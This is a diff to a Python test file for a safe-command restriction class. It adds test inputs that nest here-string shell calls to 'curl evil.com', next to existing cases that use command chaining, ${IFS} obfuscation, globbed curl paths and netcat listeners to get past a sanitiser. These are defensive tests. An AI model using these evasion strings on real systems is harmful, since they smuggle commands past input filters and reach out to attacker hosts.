@@ -281,6 +281,7 @@ class TestSafeCommandRestrictions:
             "sh -c 'whoami'",
             "find . -name '*.txt' -exec cat {} + ",
             "find . -name '*.txt' ${BADKEY:--exec} cat {} + ",
+            
 
             ["ls", "-l;", "whoami"],
             ["ls", "-l", "&&", "whoami"],
@@ -361,6 +362,9 @@ class TestSafeCommandRestrictions:
             "$IFS            nc${IFS}-l -p 1234",
             "find . -name '*' -exec \"${IFS}/usr/bin/cu*l${IFS}\" {} + ",
             "sh -c 'sh -c \"${IFS}/usr/bin/c*rl${IFS}https://example.com${IFS}\" '",
+            "sh <<< 'bash <<< \"curl evil.com\"'",
+            "sh <<< 'bash<<< \"curl evil.com\"'",
+            "sh<<<'bash<<<\"curl evil.com\"'",
 
             ["ls", "-l", "/usr/bin/nc"],
             ["ls", "-l", "/usr/bin/netcat"],
@@ -385,6 +389,9 @@ class TestSafeCommandRestrictions:
             ["$IFS            nc${IFS}", "-p", "1234"],
             ["find", ".", "-name", "'*'", "-exec", "\"${IFS}/usr/bin/cu*l${IFS}\"", "{}", "+"],
             ["sh", "-c", "sh -c \"${IFS}/usr/bin/c*rl${IFS}https://example.com${IFS}\" "],
+            ["sh", "<<<", "'bash <<< \"curl evil.com\"'"],
+            ["sh", "<<<", "'bash<<<\"curl evil.com\"'"],
+            ["sh<<<'bash<<<\"curl evil.com\"'"]
             
             
         ] 
